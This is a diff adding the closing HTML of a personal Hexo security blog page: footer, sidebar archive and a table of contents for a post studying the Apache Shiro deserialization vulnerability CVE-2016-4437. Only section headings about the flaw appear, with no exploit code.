+                    <div class="prevTitle">PE结构学习</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="//github.com/wenfenhui" class="iconfont-archer github" target="_blank" title="github"></a>
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">shiro反序列化漏洞学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">shiro介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-4437"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2016-4437</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">1.2.3.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%9D%91%E7%82%B9"><span class="toc-number">1.2.4.</span> <span class="toc-text">Shiro反序列化的坑点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%94%9FCB%E4%B8%8D%E4%BE%9D%E8%B5%96CC%E9%93%BE"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">原生CB不依赖CC链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#serialVersionUID%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">serialVersionUID的问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99shiro%E5%8A%A0%E5%AF%86%E5%B9%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.5.</span> <span class="toc-text">编写shiro加密并反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%92%8C%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.6.</span> <span class="toc-text">漏洞利用和攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4key"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">爆破key</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%92%8C%E6%8E%A2%E6%B5%8BGadget%E9%93%BE"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">爆破和探测Gadget链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE"><span class="toc-number">1.2.6.3.</span> <span class="toc-text">Shiro反序列化回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shiro%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%9D%91"><span class="toc-number">1.2.6.4.</span> <span class="toc-text">Shiro打内存马的坑</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9maxHttpHeaderSize"><span class="toc-number">1.2.6.4.1.</span> <span class="toc-text">反射修改maxHttpHeaderSize</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%93loader%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">1.2.6.4.2.</span> <span class="toc-text">打loader加载字节码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E5%88%A4%E5%88%86%E6%9E%90"><span class="toc-number">1.2.7.</span> <span class="toc-text">研判分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%84%E9%81%BF%E5%88%86%E6%9E%90%E6%B7%B7%E6%B7%86"><span class="toc-number">1.2.8.</span> <span class="toc-text">规避分析混淆</span></a></li></ol></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 4
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2026 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span>
+            <a class="archive-post-title" href="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">shiro反序列化漏洞学习</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2026/04/17/PE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/">PE结构学习</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span>
+            <a class="archive-post-title" href="/2026/04/08/impacket0.13wiki%E6%8C%87%E5%8D%97/">Impacket wiki中文指南</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span>
+            <a class="archive-post-title" href="/2026/04/07/Certipy%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/">Certipy 中文文档</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="工具wiki">
+                <span class="iconfont-archer">&#xe606;</span>
+                工具wiki
+            </span>
+            <span class="sidebar-tag-name" data-tags="PE">
+                <span class="iconfont-archer">&#xe606;</span>
+                PE
+            </span>
+            <span class="sidebar-tag-name" data-tags="shiro">
+                <span class="iconfont-archer">&#xe606;</span>
+                shiro
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+        <span class="sidebar-category-name" data-categories="工具wiki">
+            <span class="iconfont-archer">&#xe60a;</span>
+            工具wiki
+        </span>
+        <span class="sidebar-category-name" data-categories="window安全基础">
+            <span class="iconfont-archer">&#xe60a;</span>
+            window安全基础
+        </span>
+        <span class="sidebar-category-name" data-categories="java安全">
+            <span class="iconfont-archer">&#xe60a;</span>
+            java安全
+        </span>
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://wenfenhui.github.io",
+        root: siteMetaRoot,
+        author: "wenfenhui"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
